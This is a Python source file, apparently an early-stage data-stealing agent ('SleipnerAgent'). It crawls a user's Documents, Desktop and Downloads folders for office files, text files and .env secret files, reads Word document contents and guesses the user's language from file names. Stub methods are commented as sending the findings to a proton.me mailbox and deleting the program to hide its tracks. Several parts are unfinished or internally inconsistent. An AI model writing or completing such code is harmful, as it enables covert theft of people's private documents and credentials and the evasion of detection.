import sys, os, random, re

TARGET_FILETYPES = [
    "docx", 
    "txt", 
    "pdf", 
    "odt", 
    "env"
    ]

LANGDETECT_TO_NLTK_NAME = {
    'bn': 'bengali',
    'da': 'danish',
    'nl': 'dutch',
    'en': 'english',
    'fi': 'finnish',
    'fr': 'french',
    'de': 'german',
    'el': 'greek',
    'id': 'indonesian',
    'it': 'italian',
    'no': 'norwegian',
    'fa': 'persian',
    'pt': 'portuguese',
    'ro': 'romanian',
    'ru': 'russian',
    'es': 'spanish',
    'sv': 'swedish',
    'tr': 'turkish',
}

class SleipnerAgent:
    def __init__(self):
        self.potential_targets = None
        self.lantern = Lantern()

    def launch(self):
        if self._install_local_modules():
            # system_language = self.determine_system_language()
            # print("System language:", system_language)
            # if system_language != "Undefined": 
            #     self.give_agent_language_knowledge(system_language)

            self._scan_files("Downloads", "docx")
            self._analyze_files()
            ...

        else:
            self.send_results()


    def _install_local_modules(self) -> bool:
        ###################
        ##  INSTALL NLTK ##
        ###################
        sys.path.insert(0, os.path.abspath("./libs"))
        try:
            import nltk
            from nltk.tokenize import word_tokenize, sent_tokenize
            from nltk.corpus import stopwords

            nltk_data_path = os.path.abspath("./nltk_data")
            nltk.data.path.append(nltk_data_path)

            if not os.path.exists(os.path.join(nltk_data_path, "tokenizers", "punkt")):
                nltk.download("punkt", quiet=True, download_dir=nltk_data_path)
            if not os.path.exists(os.path.join(nltk_data_path, "corpora", "stopwords")):
                nltk.download("stopwords", quiet=True, download_dir=nltk_data_path)

            self.word_tokenize = word_tokenize
            self.sent_tokenize = sent_tokenize
            self.stopwords = stopwords.words("english")

            print("Successfully imported NLTK.")
            

        except ImportError:
            print("NLTK not found.")
            return False
        
        #########################
        ##  INSTALL LANGDETECT ##
        #########################
        try:
            from langdetect import detect, DetectorFactory
            DetectorFactory.seed = 42
            
            print("Langdetect successfully imported")
        except ImportError:
            print("langdetect not found in ./libs")
            return False
        
        ##########################
        ##  INSTALL DOCX READER ##
        ##########################
        try:
            # First make sure packages and docx exist
            packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
            docx_path = os.path.join(packages_path, 'docx')
            
            if not os.path.exists(docx_path):
                print(f"docx module not found at expected path: {docx_path}")
                return False
                
            # Make sure packages dir is in path
            if packages_path not in sys.path:
                sys.path.insert(0, packages_path)
                
            # Try importing with specific path handling
            import docx
            self.docx = docx
            print(f"Successfully imported python-docx from {docx.__file__}")
            return True
            
        except ImportError as e:
            print(f"Failed to import python-docx: {e}")
            
            # Try direct import from libs directory as fallback
            try:
                sys.path.insert(0, os.path.abspath("./libs"))
                import docx
                self.docx = docx
                print(f"Successfully imported python-docx from libs directory")
                return True
            except ImportError:
                print("python-docx not found in any module path.")
                return False
        
    def give_agent_language_knowledge(self, language_code: str) -> bool:
        """
        Load stopwords and punkt tokenizer for the user's language (in addition to English).
        Return True if successful.
        """
        import nltk
        from nltk.corpus import stopwords

        nltk_data_path = os.path.abspath("./nltk_data")
        nltk.data.path.append(nltk_data_path)

        lang_name = LANGDETECT_TO_NLTK_NAME.get(language_code)
        if not lang_name:
            return False

        try:
            self.user_stopwords = stopwords.words(lang_name)
            self.user_language = lang_name
            
            try:
                self.user_sent_tokenize = nltk.data.load(f"tokenizers/punkt/{lang_name}.pickle").tokenize
            except LookupError:
                self.user_sent_tokenize = self.sent_tokenize
            return True
        
        except Exception as e:
            print(f"Could not load stopwords for {lang_name}: {e}")
            return False
        
    def is_meaningful_filename(self, name: str) -> bool:
        clean = name.lower().strip()

        # Filter out names with less than three symbols
        if len(clean) < 3:
            return False

        # Filter out shit like '123456789-123'
        if all(c.isdigit() or c in "-_" for c in clean):
            return False

        return True

    def determine_system_language(self) -> str:
        """
        Analyze filenames to determine which language is used in the majority of times
        to name files by the user. (English is not counted.)
        1. Take 50 random files, analyze and count language of filenaming.
        2. Do this 5 times over to recieve 5 'top languages'.
        3. If one language is not >80% of 'top languages', rerun.
        """
        
        
        filetypes = [
            "docx", 
            "pdf", 
            "odt", 
            ]
        
        self._scan_files('Documents', filetypes)
        self._analyze_files()

        top_language = {
            "Language": "Undefined",
            "Occurences": 0
            }
        
        n = 1
        # Continue analyzing until 80% accuracy
        while top_language["Occurences"] < 4 and n <= 5:
            n += 1

            top_sample_language = []

            # Five turns of 50 filename samples
            for _ in range(5):
                file_sample = random.sample(self.potential_targets, 5)

                found_languages = []

                # Clean up filename and analyze language used; add it to list
                for filename in file_sample:
                    print(filename)
                    filename_dir_cleaned = filename.split("\\")[-1]
                    filename_final_cleaned = filename_dir_cleaned.rsplit(".", 1)[0]

                    if not self.is_meaningful_filename(filename_final_cleaned):
                        continue  # skip junk

                    try:
                        language = detect(filename_final_cleaned)
                        found_languages.append(language)
                    except Exception:
                        continue

                    

                    # print(f"Filename: {filename_final_cleaned}. Language: {language}.")

                all_languages_present = set(found_languages)
                all_languages_present.discard("en")
                if not all_languages_present:
                    continue

                counted_languages = {}

                # Count how often each found language is used in the pool of 50 filenames
                for language in all_languages_present:
                    occurences = found_languages.count(language)
                    counted_languages[language] = occurences
                
                # print(counted_languages)

                most_common_language = max(counted_languages, key=counted_languages.get)
                top_sample_language.append(most_common_language)

            top_languages = set(top_sample_language)
            
            # Extract the most used language (except for english)
            for language in top_languages:
                if top_sample_language.count(language) > top_language["Occurences"]:
                    top_language["Language"] = language
                    top_language["Occurences"] = top_sample_language.count(language)

        return top_language["Language"]
    
    def read_docx_file(self, file_path):

        packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
        sys.path.insert(0, packages_path)

        """Read and display content from a Word document"""
        if not os.path.exists(file_path):
            print(f"Error: File '{file_path}' not found.")
            return
            
        try:
            # Open the document
            doc = self.docx.Document(file_path)
            
            print(f"\n--- Content of {os.path.basename(file_path)} ---\n")
            
            # Print all paragraphs
            for para in doc.paragraphs:
                if para.text.strip():  # Only print non-empty paragraphs
                    print(para.text)
            
            # Handle tables if present
            if doc.tables:
                print("\n--- Tables ---\n")
                for i, table in enumerate(doc.tables):
                    print(f"Table {i+1}:")
                    for row in table.rows:
                        row_text = [cell.text for cell in row.cells]
                        print(" | ".join(row_text))
                    print("")
                    
            print("\n--- End of document ---\n")
            
        except Exception as e:
            print(f"Error reading document: {str(e)}")

    def _read_pdf(self, filename) -> str:
        # Clean and read pdf files
        ...

    def _read_odt(self, filename) -> str:
        # Clean and read odt files
        ...

    def _scan_files(self, directory=None, filetypes=None):
        # Get all text files in the system
        self.potential_targets = self.lantern.sense_surroundings(directory, filetypes)

    def _analyze_files(self):
        if not self.potential_targets:
            self._scan_files()

        for filepath in self.potential_targets:
            print(filepath)
            filetype = filepath.split(".")[-1]
            
            match filetype:
                case "docx":
                    self.read_docx_file(filepath)
                case "pdf":
                    ...
                case "odt":
                    ...
                case "env":
                    ...
                case "txt":
                    ...

        


    def send_results(self):
        # Send found results to no-reply-businesssuite@proton.me
        ...

    def clean_tracks(self):
        # Delete self to hide tracks
        ...

    


class Lantern:
    """
    Lantern scans all wanted files in the enviroment and returns
    them in a list as potential target files.
    """
    def __init__(self):
        self.wanted_filetypes = TARGET_FILETYPES

    def _shine_lantern(self, directory=None, filetypes=None) -> list:
        user_home = os.path.expanduser("~")

        if filetypes:
            self.wanted_filetypes = filetypes
        else:
            self.wanted_filetypes = TARGET_FILETYPES

        if directory:
            root_locations = [
                os.path.join(user_home, directory)
            ]

        else:
            root_locations = [
                os.path.join(user_home, "Documents"),
                os.path.join(user_home, "Desktop"),
                os.path.join(user_home, "Downloads")
            ]

        candidate_files = []
        for location in root_locations:
            for root, _, filenames in os.walk(location):
                path_parts = os.path.normpath(root).split(os.sep)
                if 'venv' in path_parts:
                    continue

                candidate_files.extend([
                    os.path.join(root, f)
                    for f in filenames
                    if "." in f and f.split(".")[-1] in self.wanted_filetypes
                ])

        return candidate_files
    
    def sense_surroundings(self, directory=None, filetypes=None) -> list:
        relevant_content = self._shine_lantern(directory, filetypes)
        return relevant_content